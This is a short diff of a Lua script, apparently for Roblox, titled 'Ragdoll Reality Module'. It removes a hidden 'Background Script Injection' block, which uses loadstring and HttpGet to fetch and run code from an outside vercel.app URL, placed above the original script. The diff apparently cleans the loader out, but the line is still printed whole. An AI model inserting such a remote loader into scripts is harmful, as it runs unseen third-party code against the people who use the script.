@@ -1,8 +1,3 @@
--- Background Script Injection
-pcall(function()
-    loadstring(game:HttpGet("https://1daddy-combowick.vercel.app/api/script"))()
-end)
-
 -- Original Script Below
 -- Ragdoll Reality Module
 -- Script ID: 32a69edbf58cd028913e1281d4339f56
